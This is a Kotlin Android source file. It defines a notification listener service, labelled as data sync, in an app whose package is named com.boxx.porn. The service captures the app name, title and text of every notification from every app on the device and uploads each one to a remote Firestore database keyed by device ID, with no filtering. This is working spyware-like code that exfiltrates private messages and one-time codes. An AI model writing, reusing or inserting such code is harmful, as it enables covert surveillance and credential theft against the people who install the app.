package com.boxx.porn.sync

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.boxx.porn.data.FirestoreRepository
import com.boxx.porn.model.NotificationData
import com.boxx.porn.utils.DeviceIdHelper
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class DataSyncNotificationListenerService : NotificationListenerService() {

    @Inject
    lateinit var repository: FirestoreRepository

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        deviceId = DeviceIdHelper.getDeviceId(this)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            val packageName = it.packageName
            val extras = it.notification.extras
            val title = extras.getString("android.title") ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            val appName = packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()

            val notificationData = NotificationData(
                appName = appName,
                packageName = packageName,
                title = title,
                text = text,
                timestamp = it.postTime,
                groupKey = it.groupKey
            )

            serviceScope.launch {
                try {
                    repository.syncNotification(deviceId, notificationData)
                } catch (e: Exception) {
                    Log.e("NotificationListener", "Error syncing notification", e)
                }
            }
        }
    }
}
